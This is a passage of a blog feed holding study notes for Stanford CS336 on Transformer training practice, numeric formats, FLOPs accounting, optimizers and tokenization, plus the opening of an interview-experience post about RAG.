Controversy</strong>:</p><ul><li>Theoretical research [Bhojanapalli et al 2020] suggests that ifHead_Dim (<span class="math inline">\(d_p\)</span>) is too small, therank of the Attention matrix will be limited, preventing the model fromexpressing certain complex attention patterns.</li><li>The theory suggests: Head dimensions should be increased to breakthe 1-1 ratio.</li></ul><p><strong>Practical Conclusion</strong>: Experimental data (likePerplexity vs Parameters curves) shows that despite theoreticalcontroversies, <strong>no significant low-rank bottleneck has beenobserved</strong> in practical engineering. Therefore, maintaining thestandard 1-1 ratio remains the most efficient choice.</p><h3 id="ffn-dimension-scaling-glu-variant-scaling">FFN Dimension Scaling(GLU Variant Scaling)</h3><p>When using GLU variants like SwiGLU, due to the introduction of anadditional gating matrix <spanclass="math inline">\(\boldsymbol{V}\)</span> (increased parametercount), to keep the total parameter count consistent with the standardTransformer, the hidden layer dimension <spanclass="math inline">\(d_{ff}\)</span> needs to be reduced.</p><p><strong>Scaling Rule</strong>: Scale down by <spanclass="math inline">\(2/3\)</span>. <span class="math display">\[d_{ff} = \frac{8}{3} d_{model}\]</span> This is why models like LLaMA typically have intermediatelayer dimensions around 2.67 times <spanclass="math inline">\(d_{model}\)</span>, rather than the traditional 4times.</p><h2 id="regularization">Regularization</h2><p>In training large-scale models, regularization strategies haveshifted from “preventing overfitting” to “pursuing training efficiencyand stability,” with the most significant change occurring in the use of<strong>Dropout</strong>.</p><h3 id="dropout">Dropout</h3><p><strong>Dropout</strong> was once a standard regularization method indeep learning, preventing co-adaptation between neurons by randomlysetting the outputs of neurons to zero during training, thus reducingoverfitting.</p><p><strong>Modern Trend (LLaMA / PaLM / Modern LLMs)</strong>:<strong>Complete abandonment of Dropout (Dropout rate = 0)</strong>.Current mainstream large models (like the LLaMA series, PaLM) typically<strong>do not use any Dropout</strong> during pre-training.</p><p><strong>Reasons for Abandonment</strong>:</p><ol type="1"><li><strong>Data Scale</strong>: Modern LLMs are trained on trillions oftokens, often in an “underfitting” state rather than overfitting. Thedata itself serves as the best regularization.</li><li><strong>Training Efficiency</strong>: Dropout requires storingrandom masks for backpropagation, increasing memory bandwidth overhead.In optimizations like FlashAttention, removing Dropout can significantlyenhance computational throughput.</li><li><strong>Training Stability</strong>: In extremely deep networks, therandomness introduced by Dropout can sometimes affect the stability ofgradients.</li></ol><h3 id="weight-decay">Weight Decay</h3><p>While Dropout has been discarded, <strong>Weight Decay</strong>remains an indispensable part of optimizers (like AdamW).</p><p>An additional penalty term is added to the loss function to suppressthe norm of the weight matrix from becoming too large. It pulls theweight matrix back, avoiding overfitting. Essentially, we are tellingthe model: “<strong>Unless this feature is truly important, do notassign it such a large weight.</strong>” <span class="math display">\[\mathcal{L}_{total} = \mathcal{L}_{task} + \frac{\lambda}{2}\|\theta\|^2\]</span> <strong>General Setting</strong>: Typically set to <spanclass="math inline">\(0.1\)</span> (as in GPT-3, LLaMA, PaLM).</p><p><strong>Selective Application</strong>: Not all parameters use WeightDecay.</p><ul><li><strong>Apply</strong>: Linear Layers (Attention projections, FFNweights).</li><li><strong>Skip</strong>: Bias terms, scaling factors <spanclass="math inline">\(\gamma\)</span> of LayerNorm/RMSNorm, Embeddinglayers (sometimes). Applying Weight Decay to these parameters maydisrupt numerical stability or the model’s adaptability todistributions.</li></ul><h3 id="gradient-clipping">Gradient Clipping</h3><p>To prevent exploding gradients, this is a <strong>must-have</strong>in modern Transformer training.</p><ul><li><p><strong>Mechanism</strong>: Monitor the <spanclass="math inline">\(L_2\)</span> norm (<spanclass="math inline">\(|g|\)</span>) of the global gradients. If itexceeds a threshold <span class="math inline">\(C\)</span> (usually1.0), scale the gradients: <span class="math display">\[\text{if } \|g\| &gt; C, \quad g \leftarrow g \cdot \frac{C}{\|g\|}\]</span></p></li><li><p><strong>Effect</strong>: Even with RMSNorm and QK-Norm, duringthe initial training phase or when encountering “bad data,” GradientClipping remains the last line of defense to ensure training does notcollapse.</p></li></ul><h2 id="training-stability">Training Stability</h2><h3 id="gradient-norm-attention-optimizations">Gradient Norm &amp;Attention Optimizations</h3><p><strong>Phenomenon</strong>: Unoptimized models (like OLMo 0424)frequently exhibit severe <strong>gradient spikes</strong> duringtraining, leading to significant loss curve spikes and potentialdivergence in training.</p><p><strong>Optimization</strong>: By improving Attention computation(such as <strong>QK-Norm</strong> or <strong>LogitSoftcapping</strong>), the gradient norm (L2 norm) can be kept very lowand smooth, achieving an extremely stable training process.</p><p><strong>QK-Norm (Query-Key Normalization)</strong></p><p>In standard Attention computation, <spanclass="math inline">\(Q\)</span> and <spanclass="math inline">\(K\)</span> are multiplied directly: <spanclass="math display">\[\text{Score} = \frac{Q K^T}{\sqrt{d}}\]</span> If the model allows the vector norms of <spanclass="math inline">\(Q\)</span> or <spanclass="math inline">\(K\)</span> to become very large during training,their inner product (dot product) will also become enormous. Evendividing by <span class="math inline">\(\sqrt{d}\)</span> cannot offsetthis growth.</p><p><strong>QK-Norm</strong> applies LayerNorm (or RMSNorm) to <spanclass="math inline">\(Q\)</span> and <spanclass="math inline">\(K\)</span> <strong>before</strong> performingmatrix multiplication: <span class="math display">\[Q&#39; = \text{LayerNorm}(Q) \\ K&#39; = \text{LayerNorm}(K) \\\text{Score} = \frac{Q&#39; (K&#39;)^T}{\sqrt{d}}\]</span> <strong>Why does it stabilize training?</strong></p><ol type="1"><li><strong>Decoupling magnitude from direction</strong>: The essence ofAttention is to compute the “similarity” (directional consistency) ofvectors. QK-Norm forces the vectors to project onto a fixed hypersphere,eliminating interference from magnitude and allowing the model to focuson learning vector directions.</li><li><strong>Preventing numerical explosion</strong>: Since LayerNormrestricts outputs within a specific statistical distribution (usuallywith variance 1), the result of <span class="math inline">\(Q \cdotK^T\)</span> is naturally limited to a reasonable numerical range,avoiding logits values in the thousands or even tens of thousands.</li></ol><p><strong>Logit Softcapping</strong></p><p>This is a key technique used in <strong>Gemma 2</strong> and<strong>OLMo 2</strong>. Compared to QK-Norm’s input normalization,Logit Softcapping performs <strong>non-linear truncation</strong> on theoutput results. This, along with the z-loss discussed below, optimizesthe stability of softmax.</p><p>It uses the <span class="math inline">\(\tanh\)</span> function tolimit logits within a fixed range (e.g., <spanclass="math inline">\([-C, C]\)</span>). <span class="math display">\[\text{Logits}_{\text{capped}} = C \cdot \tanh\left(\frac{q^T k}{C \cdot\sqrt{d}}\right)\]</span> where <span class="math inline">\(C\)</span> is ahyperparameter (Cap value), typically set to 30 or 50.</p><p><strong>Why does it stabilize training?</strong></p><ol type="1"><li><strong>Hard Bound</strong>: The range of <spanclass="math inline">\(\tanh(x)\)</span> is <spanclass="math inline">\((-1, 1)\)</span>. As <spanclass="math inline">\(x\)</span> approaches 0, <spanclass="math inline">\(\tanh(u) \approx u\)</span>, maintaining linearitywhen the numbers are small, making this method almost ineffective atthat point. However, when <span class="math inline">\(x\)</span> islarge, <span class="math inline">\(\tanh\)</span> approaches 1 or -1,thus being limited within the <span class="math inline">\([-C,C]\)</span> range. Therefore, regardless of how large <spanclass="math inline">\(q^T k\)</span> is computed, the final logits’absolute value will never exceed <spanclass="math inline">\(C\)</span>.</li><li><strong>Preventing Softmax entropy collapse</strong>: If a logitvalue is extremely large (e.g., 1000), after applying softmax, theprobability will become 1 (one-hot), while others become 0, leading togradient vanishing. Softcapping ensures that the probabilitydistribution output by softmax retains a certain level of entropy(uncertainty), allowing gradients to continue flowing back.</li></ol><h3 id="output-softmax-stability-the-z-loss">Output Softmax Stability:The “z-loss”</h3><p>To address the numerical overflow issue of the output layer softmax(logits being too large leading to the partition function <spanclass="math inline">\(Z(x)\)</span> exploding), PaLM introduced the<strong>z-loss</strong> trick.</p><p><strong>Principle</strong>: An auxiliary penalty term is added to thetotal loss, encouraging the partition function <spanclass="math inline">\(\log Z\)</span> to approach 0, at which point<span class="math inline">\(Z\)</span> approaches 1. <spanclass="math display">\[Z(x) = \sum_{i} e^{z_i} \\L_{\text{total}} = L_{\text{original}} + 10^{-4} \cdot \log^2 Z\]</span> <strong>Application</strong>: This technique is primarily usedfor numerical stability during low-precision (<code>bfloat16</code>)training on TPU/GPU and has been widely adopted by models like Baichuan2, DCLM, OLMo 2, etc.</p><h2 id="attention-efficiency">Attention Efficiency</h2><p>As the context window of models increases, memory usage and bandwidthduring inference become major bottlenecks. Although the corearchitecture of the Transformer remains largely unchanged, significantadjustments have been made to the design of Attention Heads forefficiency.</p><h3 id="inference-bottleneck-incremental-generation-kv-cache">InferenceBottleneck: Incremental Generation &amp; KV Cache</h3><p>During text generation, the model generates tokens step-by-step andcannot parallelize.</p><p><strong>KV Cache</strong>: To avoid recalculating the Attention forall previous tokens each time a new token is generated, we must cachethe Key and Value matrices of all previous tokens.</p><p><strong>Memory Pressure</strong>: As the sequence lengthens, the sizeof the KV Cache grows linearly, potentially exceeding the memory usageof the model weights. This limits the maximum batch size and contextlength.</p><h3 id="optimization-solutions-gqa-mqa">Optimization Solutions: GQA /MQA</h3><p>To address the issue of oversized KV Cache, modern models reduce thenumber of Key/Value Heads to lower inference costs.</p><ul><li><strong>MQA (Multi-Query Attention)</strong>:<ul><li><strong>Mechanism</strong>: All Query Heads <strong>share thesame</strong> Key Head and Value Head.</li><li><strong>Advantage</strong>: Extreme memory savings and inferenceacceleration.</li></ul></li><li><strong>GQA (Grouped Query Attention)</strong>:<ul><li><strong>Mechanism</strong>: Groups Query Heads, with each groupsharing a KV Head. For example, LLaMA 2/3.</li><li><strong>Positioning</strong>: This is a compromise solution,balancing inference efficiency and model performance.</li></ul></li></ul><p><img src="https://raw.githubusercontent.com/XLOverflow/blog-image/main/image-20251216194519072.png" style="zoom:40%;" /></p><h3 id="other-attention-variants">Other Attention Variants</h3><p><strong>Sparse / Sliding Window Attention</strong>: Models likeMistral and GPT-4 reduce complexity from <spanclass="math inline">\(O(N^2)\)</span> by limiting Attention to onlyrecent windows or sparse points, enabling them to handle extremely longtexts.</p><p><img src="https://raw.githubusercontent.com/XLOverflow/blog-image/main/image-20251216194550997.png" alt="image-20251216194550997" style="zoom:35%;" /></p>]]></content>
      
      
      <categories>
          
          <category> Stanford CS336 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Study Notes </tag>
            
            <tag> AI </tag>
            
            <tag> Transformer </tag>
            
            <tag> LLM </tag>
            
            <tag> CS336 </tag>
            
            <tag> Stanford </tag>
            
            <tag> Architectures </tag>
            
            <tag> Hyperparameters </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CS336-Lec2 PyTorch &amp; Resource accounting</title>
      <link href="/2025/12/15/CS336/CS336-Lec2-PyTorch-Resource-accounting/"/>
      <url>/2025/12/15/CS336/CS336-Lec2-PyTorch-Resource-accounting/</url>
      
        <content type="html"><![CDATA[<h1 id="lec-2-pytorch-resource-accounting">Lec 2: PyTorch &amp; Resourceaccounting</h1><h2 id="numeric-formats-float-pointing-formats">Numeric Formats (FloatPointing Formats)</h2><p>Before diving into computations, we need to understand what we arecalculating. This involves many trade-offs between <strong>computationalefficiency</strong> and <strong>numerical precision</strong>.</p><p>Any floating-point number in a computer consists of three parts: thesign bit (Sign), the exponent (Exponent), and the fraction (Fraction).The calculation formula is <span class="math display">\[(-1)^S \times 1.M \times 2^{E-Bias}\]</span></p><ul><li>S determines the sign</li><li>M determines precision; the more digits after the decimal point, thedenser the number</li><li>E determines the dynamic range; the more bits, the larger the rangerepresented</li><li>Bias is a fixed constant that allows the exponent to be negative,balancing the positive and negative ranges</li></ul><h3 id="why-not-use-fp32-exclusively">Why Not Use FP32 Exclusively</h3><p>Standard FP32 (Single Precision) has 1 sign bit, 8 exponent bits, and23 fraction bits.</p><ul><li>Advantages: High precision, large range, stable training</li><li>Disadvantages: Slow, consumes a lot of memory</li><li>In modern large model training, FP32 is mainly used for backupduring optimizer updates, rather than core computations.</li></ul><h3 id="fp16-and-bf16">FP16 and BF16</h3><p>To seek faster computational efficiency, the industry mainly uses16-bit formats, primarily FP16 and BF16.</p><ol type="1"><li><p>FP16 (Half Precision):</p><ul><li><p>Structure: 5 bits for exponent + 10 bits for fraction</p></li><li><p>Drawback: The small number of exponent bits means a <strong>smalldynamic range</strong>; if the value is too small, it can lead tounderflow, such as <spanclass="math inline">\(1e^{-8}\)</span>.</p></li></ul></li><li><p>BF16 (Brain Float 16):</p><ul><li>Structure: 8 bits for exponent + 7 bits for fraction</li><li>Core advantage: The exponent bits are the same as FP32, meaning ithas the <strong>same dynamic range as FP32</strong>, with slightly lowerprecision.</li><li>Conclusion: Deep learning is sensitive to “range” and not sensitiveto “precision”; neural networks are inherently fuzzy approximations,making BF16 the <strong>standard format for training large modelstoday</strong>.</li></ul></li></ol><hr /><h2 id="measuring-computational-power-flops">Measuring ComputationalPower: FLOPs</h2><h3 id="matrix-multiplication-matmul">Matrix Multiplication(MatMul)</h3><p>The core of deep learning is matrix multiplication <spanclass="math inline">\(Y = X \times W\)</span>, and the computationalcost formula is as follows: <span class="math display">\[FLOPs = 2 \cdot B \cdot D \cdot K\]</span></p><ul><li>B: Batch Size</li><li>D: Input Dimension</li><li>K: Output Dimension</li><li>Origin of 2: A single FMA (Fused Multiply-Add) instruction at thecomputer level typically counts as 2 FLOPs, one multiplication and oneaddition.</li></ul><h3 id="training-cost-law-126">Training Cost Law: 1:2:6</h3><p>This is the most important Rule of Thumb for this lesson: Why istraining so much more expensive than inference?</p><p>The entire training process is divided into <strong>forward andbackward propagation</strong>, each with its own computational cost.</p><ul><li>Forward Pass: Computes <span class="math inline">\(H = XW\)</span>.Consumes 1 unit of computational power.</li><li>Backward Pass: Requires calculating two gradients, the first is theweight gradient <span class="math inline">\(dW\)</span>, and the inputgradient <span class="math inline">\(dX\)</span>. The former is used toupdate parameters, while the latter is propagated to the previouslayer.</li></ul><p>For a model with P parameters trained with N tokens, the totalfloating-point operation volume is approximately: <spanclass="math display">\[C \approx 6 \cdot N \cdot P\]</span> The forward pass accounts for 2 FLOPs, the backward pass for 4FLOPs, resulting in a total of 6, which gives us the above ratio.</p><p>The parameter count we discuss here always refers to the<strong>total number of physically independent variables (excludingshared parameters) that need to be updated by theoptimizer</strong>.</p><p>For shared parameters, they indeed <strong>reduce the parametercount</strong>, but in terms of computation, the <strong>FLOPs do notdecrease</strong> because you still need to traverse the networkstructure through these layers to perform the correspondingcalculations.</p><p>The reason we use <span class="math inline">\(\approx\)</span> hereis that we ignore two things:</p><ul><li><strong>Embedding layers and Softmax layers</strong>: These twolayers have a considerable number of parameters P, and the vocabulary islarge, but they do not fully adhere to the 2P computational logic.However, compared to the dozens of intermediate Transformer Blocks, theerror is acceptable.</li><li><strong>Attention’s <span class="math inline">\(N^2\)</span>computation</strong>: We previously assumed that computational power isrelated to the parameter count P, but due to Attention, themultiplication of Query and Key has a computational volume of <spanclass="math inline">\(N^2\)</span>. This part does not consumeparameters, but as long as N (sequence length) is much smaller than P,this term can be ignored.</li></ul><p>You might wonder why Attention is <spanclass="math inline">\(N^2\)</span>?</p><p>Actually, this is more like a simplification of time complexity; theprecise computational formula is:</p><p><span class="math display">\[12N^2LH = \underbrace{L}_{\text{number of layers}} \times\underbrace{(4N^2H)}_{\text{forward propagation}} \times\underbrace{3}_{\text{training coefficient}}\]</span></p><ul><li>L is the number of layers in the Transformer, and the model isstacked with L identical blocks.</li><li>The forward propagation part involves the multiplication of QKVmatrices.</li><li>The training coefficient follows forward propagation 1, backwardpropagation 2, totaling 3.</li></ul><p>We are comparing: <strong>“huge parameter count P”</strong> vs<strong>“sequence length N”</strong>. In current standard modelconfigurations, the former is much larger than the latter.</p><h3 id="hardware-h100-and-tensor-cores">Hardware: H100 and TensorCores</h3><p>GPUs have general cores and specialized cores:</p><ul><li>CUDA Cores: <strong>General, flexible but slow</strong>, handlingFP32/FP64</li><li>Tensor Cores: <strong>Designed specifically for matrixmultiplication</strong>, H100’s Tensor Core can execute <spanclass="math inline">\(4 \times 4\)</span> matrix operations every clockcycle, supporting <strong>mixed precision</strong>; inputs can beFP16/BF16, while internal accumulation uses FP32, balancing speed andnumerical stability.</li></ul><p>Sparsity:</p><p>NVIDIA promotes that the H100 has 1979 TFLOPs of FP16 computationalpower. However, the truth is that this is the theoretical value afterenabling (Structured Sparsity (2:4)), which requires that every 4elements must have 2 zeros to skip zero calculations.</p><p>In reality, most training is dense training, so <strong>computationalpower is effectively halved</strong>.</p><h2 id="engineering-practice-code-and-dimension-management">EngineeringPractice: Code and Dimension Management</h2><h3 id="dimensionality-hell">Dimensionality Hell</h3><p>In Transformer code, manually handling dimensions (like<code>view</code>, <code>transpose</code>) is prone to errors and hardto debug:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">x = x.view(B, N, H, D).permute(<span class="number">0</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">3</span>) <span class="comment"># Who are 0, 2, 1, 3?</span></span><br></pre></td></tr></table></figure><h3 id="einops-library">Einops Library</h3><p>The course strongly recommends using the <code>einops</code> library,which makes dimension transformations “declarative” and“self-documenting”:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> einops <span class="keyword">import</span> rearrange</span><br><span class="line"></span><br><span class="line"><span class="comment"># Clear semantics: Extract the Head dimension and place it before the sequence length</span></span><br><span class="line">q = rearrange(x, <span class="string">&#x27;b s (h d) -&gt; b h s d&#x27;</span>, h=<span class="number">8</span>)</span><br></pre></td></tr></table></figure><p><strong>Principle</strong>: Code is not just for machines to run; itis also for people to read. Explicit is better than implicit.</p><hr /><h2 id="optimizer">Optimizer</h2><h3 id="origin-of-adamw">Origin of AdamW</h3><p>The mainstream optimizer we use now is AdamW, but how did itevolve?</p><ul><li><strong>SGD</strong>: Simple gradient descent, moving based on thedirect gradient.</li><li><strong>Momentum</strong>: Adds “inertia,” physical momentum used toaccumulate momentum on steep slopes, pushing through flat areas, as flatareas may be saddle points or local optima where regular SGD mightstop.</li><li><strong>RMSProp</strong>: Adds an adaptive step size (second-ordermomentum), <strong>small steps on steep paths, large steps on flatpaths</strong>.</li><li><strong>Adam</strong>: Momentum + RMSProp. Integrates the advantagesof the first two.</li></ul><h3 id="what-is-momentum">What is Momentum</h3><p>In deep learning optimizers, momentum is mainly divided intofirst-order and second-order momentum:</p><ul><li><strong>First-order momentum</strong> (Momentum) is the average ofgradients, retaining the sign, determining whether to move forward orbackward. It considers the new speed based on historical velocity andcurrent acceleration (gradient).</li><li><strong>Second-order momentum</strong> (Second Moment) is theaverage of squared gradients; since it is squared, the sign disappears,indicating it only cares about the magnitude and not the direction,measuring how steep the gradient is.</li></ul><p><strong>RMSProp</strong> (Root Mean Square Propagation): <spanclass="math display">\[\text{Parameter Update} = \frac{\text{LearningRate}}{\sqrt{\text{Second-order Momentum}}} \times \text{Gradient}\]</span> It can reduce the step size when the gradient is large (smallsteps on steep paths) and amplify it when small (large steps on flatpaths), addressing the <strong>oscillation problem in valleys</strong>and convergence issues at saddle points.</p><h3 id="adam-adaptive-moment-estimation">Adam (Adaptive MomentEstimation)</h3><p><span class="math display">\[\begin{aligned}\text{1. Compute Gradient:} &amp;\quad g_t = \nabla_\thetaJ(\theta_{t-1}) \\\text{2. Update First-order Momentum (Momentum):} &amp;\quad m_t =\beta_1 m_{t-1} + (1-\beta_1) g_t \\\text{3. Update Second-order Momentum (RMSProp):} &amp;\quad v_t =\beta_2 v_{t-1} + (1-\beta_2) g_t^2 \\\text{4. Bias Correction:} &amp;\quad \hat{m}_t =\frac{m_t}{1-\beta_1^t}, \quad \hat{v}_t = \frac{v_t}{1-\beta_2^t} \\\text{5. Parameter Update (Final Update):} &amp;\quad \theta_t =\theta_{t-1} - \eta \cdot \frac{\hat{m}_t}{\sqrt{\hat{v}_t}+\epsilon}\end{aligned}\]</span></p><p><span class="math display">\[\theta_t = \theta_{t-1} - \eta \cdot \frac{\overbrace{\left(\frac{\beta_1 m_{t-1} + (1-\beta_1)g_t}{1-\beta_1^t}\right)}^{\text{Corrected First-order Momentum (Direction +Inertia)}}}{\underbrace{\sqrt{\frac{\beta_2 v_{t-1} +(1-\beta_2)g_t^2}{1-\beta_2^t}}}_{\text{Corrected Second-order Momentum(Adaptive Step Size)}} + \epsilon}\]</span> A simple analysis shows that the numerator represents inertia,while the denominator represents resistance, or normalization.Essentially, this formula embodies the inertia of code momentum pushingforward while simultaneously having RMSProp’s adaptive braking.</p><h2 id="key-takeaways">Key Takeaways</h2><ol type="1"><li><strong>Where Did the Computational Power Go?</strong> The vastmajority of computational power (&gt;95%) is spent on<strong>Forward</strong> and <strong>Backward</strong> matrixmultiplications.</li><li><strong>Where Did the Memory Go?</strong><ul><li><strong>Static</strong>: Model parameters (Weights) + Optimizerstates (Optimizer States).</li><li><strong>Dynamic</strong>: Intermediate activation values(Activations). The larger the Batch Size and the longer the ContextLength, the more terrifying the memory consumption of activationvalues.</li></ul></li><li><strong>Where Are the Bottlenecks?</strong><ul><li>Matrix multiplication layers are usually <strong>ComputeBound</strong> (limited by computational power).</li><li>LayerNorm, Softmax, CrossEntropy are typically <strong>MemoryBound</strong> (limited by memory bandwidth).</li></ul></li></ol>]]></content>
      
      
      <categories>
          
          <category> Stanford CS336 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Study Notes </tag>
            
            <tag> AI </tag>
            
            <tag> LLM </tag>
            
            <tag> CS336 </tag>
            
            <tag> PyTorch </tag>
            
            <tag> Stanford </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CS336-Lec1 Tokenization</title>
      <link href="/2025/12/14/CS336/CS336-Lec1-Tokenization/"/>
      <url>/2025/12/14/CS336/CS336-Lec1-Tokenization/</url>
      
        <content type="html"><![CDATA[<h1 id="lec-1-tokenization">Lec 1: Tokenization</h1><p>The essence of a language model is to model a sequence of tokens.</p><p><span class="math display">\[p(x_1, x_2, \dots, x_T)\]</span> where <span class="math inline">\(x_T\)</span> represents aninteger token id. We also need an <strong>abstract interface</strong>for bidirectional mapping, which is the Tokenizer.</p><ul><li><code>encode(str) -&gt; List[int]</code></li><li><code>decode(List[int]) -&gt; str</code></li></ul><p><strong>Tradeoffs</strong>:</p><ul><li>Vocabulary size is big: sequences are short, but there may be raretokens that are not learned, and embeddings are huge.</li><li>Vocabulary size is small: good generalization, fewer parameters, butlonger sequences lead to expensive Transformer attention <spanclass="math inline">\(O(T^2)\)</span>.</li></ul><p><strong>Q&amp;A:</strong></p><ol type="1"><li><p><strong>Why does a large vocabulary not equal “easier to learn,”but instead leads to the problem of “rare tokens not beinglearned”?</strong></p><p>If the vocabulary contains very rare whole words as a single token,such as <code>"supercalifragilisticexpialidocious"</code>, which mayappear only once or a few times in training, its correspondingembedding/output weight is essentially not trained. In this case, if asmaller vocabulary is used, this long word will be split into multiplemore common subword/character combinations, which can be learnedbetter.</p></li><li><p><strong>Why does a large vocabulary lead to an overall increasein embedding size?</strong></p><p>This is mainly because the shape of the output logits is <spanclass="math inline">\(\text{Vocab_size} \times\text{Hidden_size}\)</span>. When the vocabulary increases, the numberof parameters in this area doubles, leading to higher costs.</p></li></ol><h2 id="compression-ratio">Compression Ratio</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">num_bytes = <span class="built_in">len</span>(string.encode(<span class="string">&quot;utf-8&quot;</span>))</span><br><span class="line">indices = tokenizer(string)</span><br><span class="line">num_tokens = <span class="built_in">len</span>(indices)</span><br></pre></td></tr></table></figure><p><span class="math display">\[\text{compression_ratio} = \frac{\text{num_bytes}}{\text{num_tokens}}\]</span> A larger value indicates that each token can represent morebytes, resulting in a <strong>shorter</strong> sequence and a higherdegree of information compression.</p><h2 id="character-tokenizer">Character Tokenizer</h2><p>The core idea is to break the string into Unicode characters,converting each character to an integer using <code>ord()</code>.<code>decode</code> uses <code>chr()</code> to piece it backtogether.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">encode: <span class="built_in">list</span>(<span class="built_in">map</span>(<span class="built_in">ord</span>, string))</span><br><span class="line">decode: <span class="string">&quot;&quot;</span>.join(<span class="built_in">map</span>(<span class="built_in">chr</span>, indices))</span><br></pre></td></tr></table></figure><p>The advantage is that it is <strong>simple and reversible</strong>,while the disadvantage is that the <strong>vocabulary is verylarge</strong> (approximately 150K+ Unicode characters), with many rarecharacters, leading to <strong>wasted vocabulary capacity</strong>.</p><h2 id="byte-tokenizer">Byte Tokenizer</h2><p>The core idea is to convert the string to UTF-8 bytes, where eachbyte is in the range of 0-255. The vocabulary is fixed at<strong>256</strong>.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">string_bytes = string.encode(<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line">indices = <span class="built_in">list</span>(<span class="built_in">map</span>(<span class="built_in">int</span>, string_bytes))</span><br><span class="line">decode: <span class="built_in">bytes</span>(indices).decode(<span class="string">&quot;utf-8&quot;</span>)</span><br></pre></td></tr></table></figure><p><strong>Compression_ratio is always equal to 1.</strong></p><p>The advantage is that the <strong>vocabulary is small</strong> andcompletely reversible, but the <strong>sequences are too long</strong>,which is disastrous for attention mechanisms.</p><h2 id="word-tokenizer">Word Tokenizer</h2><p>The core idea is to use regular expressions to split the text intosegments, assigning an id to each segment.</p><p>The advantage is that sequences will be shorter, but the disadvantageis that the vocabulary size is not fixed and can potentially explode.New words require <code>UNK</code> (which affects perplexity andgeneralization experience).</p><h2 id="bpe-tokenizer">BPE Tokenizer</h2><p>Find a balance between the “small vocabulary of bytes” and the “shortsequences of words”:</p><ul><li>Common segments are merged into a single token (shortening thesequence).</li><li>Rare segments can still degrade into multiple bytes.</li></ul><p>Execution steps, starting from bytes, repeat for<code>num_merges</code> times:</p><ol type="1"><li>Count the occurrences of all adjacent pairs in the currentsequence.</li><li>Find the most frequent pair.</li><li>Merge it into a new token (new id = 256 + i).</li><li>Update vocab: <code>vocab[new] = vocab[a] + vocab[b]</code>.</li><li>Replace all occurrences of that pair in the sequence.</li></ol><p>Encode/Decode</p><ul><li>encode: Start from bytes and merge pairs in the order ofmerges.</li><li>decode: Map each token id back to bytes, then piece them together todecode utf-8.</li></ul><p>The advantage is that the <strong>vocabulary is controllable</strong>(256 + num_merges) and the <strong>sequences are shorter</strong>, whilethe disadvantage is that <strong>naive encoding can be veryslow</strong>.</p><h2 id="reference">Reference</h2><p><ahref="https://stanford-cs336.github.io/spring2025-lectures/?trace=var/traces/lecture_01.json">LectureMaterial</a></p>]]></content>
      
      
      <categories>
          
          <category> Stanford CS336 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Study Notes </tag>
            
            <tag> AI </tag>
            
            <tag> Tokenization </tag>
            
            <tag> LLM </tag>
            
            <tag> CS336 </tag>
            
            <tag> Stanford </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>淘天ai agent面经</title>
      <link href="/2025/12/14/Personal/%E6%B7%98%E5%A4%A9ai-agent%E9%9D%A2%E7%BB%8F/"/>
      <url>/2025/12/14/Personal/%E6%B7%98%E5%A4%A9ai-agent%E9%9D%A2%E7%BB%8F/</url>
      
        <content type="html"><![CDATA[<h1 id="taotian-ai-agent-interview-experience">TaoTian AI AgentInterview Experience</h1><h2id="introduction-to-the-rag-process-understanding-encoding-models-principles-advantages-and-disadvantages-how-to-evaluate-encoding-model-capabilities">1.Introduction to the RAG Process; Understanding Encoding Models,Principles, Advantages, and Disadvantages; How to Evaluate EncodingModel Capabilities</h2><p>The core process of RAG (Retrieval-Augmented Generation) consists of:<strong>Data Preparation</strong> (cleaning, chunking, vectorization,storage), <strong>Retrieval</strong> (similarity search),<strong>Augmentation</strong> (injecting context into the prompt), and<strong>Generation</strong> (LLM output).</p><h3id="principles-and-advantagesdisadvantages-of-encoding-models">Principlesand Advantages/Disadvantages of Encoding Models</h3><p>Encoding models are typically based on <strong>BERT/RoBERTa</strong>and other encoder-only architectures. They map text intohigh-dimensional vector space using a bidirectional attentionmechanism.</p><ul><li><strong>Principle</strong>: Utilizing contrastive learning to ensuresemantically similar texts are closer together in vector space (CosineSimilarity).</li><li><strong>Advantages</strong>: High computational efficiency, suitablefor large-scale semantic searches.</li><li><strong>Disadvantages</strong>: Limited by context window length(usually 512-812 characters); unable to understand extremely complexlong-range logic.</li></ul><h3 id="evaluation-metrics">Evaluation Metrics</h3><ul><li><strong>MTEB (Massive Text Embedding Benchmark)</strong>: Currentlyrecognized as an authoritative leaderboard.</li><li><strong>Retrieval Accuracy</strong>: <span class="math inline">\(HitRate@K\)</span> (whether the top K results contain the correct answer)and <strong>MRR</strong> (Mean Reciprocal Rank).</li></ul><h2id="what-are-the-classifications-of-rag-what-implementation-frameworks-exist-for-multimodal-rag-how-are-pseudo-multimodal-rag-and-multimodal-rag-implemented-and-what-are-the-differences-what-type-of-multimodal-rag-can-clip-be-used-for-and-why">2.What are the Classifications of RAG; What Implementation FrameworksExist for Multimodal RAG; How are Pseudo-Multimodal RAG and MultimodalRAG Implemented, and What are the Differences; What Type of MultimodalRAG Can CLIP Be Used For, and Why</h2><h3 id="naive-rag-simple-retrieval">Naive RAG (Simple Retrieval)</h3><p>This is the most basic <strong>Index -&gt; Retrieve -&gt; Augment-&gt; Generation</strong> linear process.</p><ul><li><strong>Method</strong>: Chunk documents and store them in a vectordatabase. When a user asks a question, convert the question into avector to find the most similar Top-K segments, which are then fed tothe LLM.</li><li><strong>Drawbacks</strong>:<ul><li><strong>Slow/Low Accuracy Retrieval</strong>: Vector matching mayonly find segments that are 